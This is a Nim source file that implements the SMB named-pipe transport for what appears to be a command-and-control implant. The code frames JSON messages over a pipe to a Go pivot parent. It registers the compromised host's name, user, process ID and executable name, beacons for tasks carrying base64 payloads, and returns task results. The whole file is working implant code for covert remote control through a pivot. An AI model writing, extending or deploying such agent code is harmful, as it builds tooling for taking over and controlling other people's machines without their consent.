## SMB named-pipe transport for Nim agent.
## Wire protocol matches Go transport_smb_windows.go:
##   each message is [4-byte LE length][JSON payload]
## The pivot parent (Go pipe_server_windows.go) handles AES and HTTP relay.
import winim/lean
import std/[json, base64, strutils]
import config

# WaitNamedPipeW is not always in winim/lean — declare explicitly
proc WaitNamedPipeW(lpName: LPCWSTR, nTimeOut: DWORD): WINBOOL
  {.stdcall, dynlib: "kernel32", importc.}

type AgentTransport* = object
  pipe*:    HANDLE
  agentId*: string
  aesKey*:  seq[byte]   # kept for compatibility; pivot handles crypto

# ── framing ─────────────────────────────────────────────────────────────────

proc pipeReadMsg(pipe: HANDLE): seq[byte] =
  var hdr: array[4, byte]
  var got: DWORD
  if not ReadFile(pipe, addr hdr[0], 4, addr got, nil).bool or got < 4:
    return @[]
  let length = uint32(hdr[0]) or (uint32(hdr[1]) shl 8) or
               (uint32(hdr[2]) shl 16) or (uint32(hdr[3]) shl 24)
  if length == 0 or length > 10_000_000'u32: return @[]
  result = newSeq[byte](int(length))
  var offset = 0
  while offset < int(length):
    if not ReadFile(pipe, addr result[offset],
                    DWORD(int(length) - offset), addr got, nil).bool:
      return @[]
    inc offset, int(got)

proc pipeWriteMsg(pipe: HANDLE; data: seq[byte]) =
  let n = uint32(data.len)
  var hdr = [byte(n), byte(n shr 8), byte(n shr 16), byte(n shr 24)]
  var got: DWORD
  discard WriteFile(pipe, addr hdr[0], 4, addr got, nil)
  if data.len > 0:
    discard WriteFile(pipe, unsafeAddr data[0], DWORD(data.len), addr got, nil)

# ── connection ───────────────────────────────────────────────────────────────

proc openPipe(name: string): HANDLE =
  let full = if name.startsWith("\\\\"): name else: r"\\.\pipe\" & name
  CreateFileW(newWideCString(full),
    GENERIC_READ or GENERIC_WRITE, 0, nil, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, 0)

proc newTransport*(): AgentTransport =
  let full = r"\\.\pipe\" & SMBPipe
  while true:
    result.pipe = openPipe(SMBPipe)
    if result.pipe != INVALID_HANDLE_VALUE: return
    discard WaitNamedPipeW(newWideCString(full), 5000)

# ── protocol ─────────────────────────────────────────────────────────────────

proc getEnvStr(k, default: string): string =
  var buf = newWideCString(newString(512))
  let n = GetEnvironmentVariableW(newWideCString(k), buf, 512)
  if n == 0: return default
  $buf

proc exeName*(): string =
  var buf = newWideCString(newString(MAX_PATH))
  let n = GetModuleFileNameW(0, buf, MAX_PATH)
  if n == 0: return "agent.exe"
  let full = $buf
  let i = max(full.rfind('\\'), full.rfind('/'))
  if i < 0: full else: full[i+1..^1]

proc register*(t: var AgentTransport): bool =
  let req = %*{
    "type":         "REGISTER",
    "hostname":     getEnvStr("COMPUTERNAME", "UNKNOWN"),
    "username":     getEnvStr("USERNAME", "UNKNOWN"),
    "os":           "windows/amd64",
    "pid":          int(GetCurrentProcessId()),
    "transport":    "smb",
    "sleep_sec":    SleepSec,
    "jitter_pct":   JitterPct,
    "process_name": exeName(),
    "is_admin":     false
  }
  pipeWriteMsg(t.pipe, cast[seq[byte]]($req))
  let resp = pipeReadMsg(t.pipe)
  if resp.len == 0: return false
  try:
    let j = parseJson(cast[string](resp))
    t.agentId = j["agent_id"].getStr()
    t.aesKey  = cast[seq[byte]](base64.decode(j["aes_key"].getStr()))
    return true
  except: return false

type TaskWire* = object
  id*:      int64
  typ*:     string
  args*:    string
  payload*: seq[byte]

proc beacon*(t: var AgentTransport): seq[TaskWire] =
  let req = %*{"type": "BEACON", "agent_id": t.agentId}
  pipeWriteMsg(t.pipe, cast[seq[byte]]($req))
  let resp = pipeReadMsg(t.pipe)
  if resp.len == 0: return @[]
  try:
    let s = cast[string](resp)
    if s == "null" or s == "": return @[]
    let j = parseJson(s)
    if j.kind != JArray: return @[]
    for tw in j:
      var task = TaskWire(
        id:   tw["id"].getBiggestInt(),
        typ:  tw["type"].getStr(),
        args: tw{"args"}.getStr(""))
      let pl = tw{"payload"}.getStr("")
      if pl != "": task.payload = cast[seq[byte]](base64.decode(pl))
      result.add(task)
  except: discard

proc sendResult*(t: var AgentTransport; taskId: int64; output, errStr: string) =
  let req = %*{
    "type":     "RESULT",
    "task_id":  taskId,
    "output":   output,
    "error":    errStr,
    "agent_id": t.agentId
  }
  pipeWriteMsg(t.pipe, cast[seq[byte]]($req))

proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
                      output, errStr: string; isAdmin: bool) =
  let req = %*{
    "type":     "RESULT",
    "task_id":  taskId,
    "output":   output,
    "error":    errStr,
    "agent_id": t.agentId,
    "is_admin": isAdmin
  }
  pipeWriteMsg(t.pipe, cast[seq[byte]]($req))

proc uploadFile*(t: var AgentTransport; taskId: int64;
                 filename: string; data: seq[byte]) =
  # Not supported via pipe — acknowledge task
  t.sendResult(taskId, "[!] uploadFile not supported over SMB pivot", "")

proc downloadFile*(t: var AgentTransport; filename: string): seq[byte] =
  return @[]
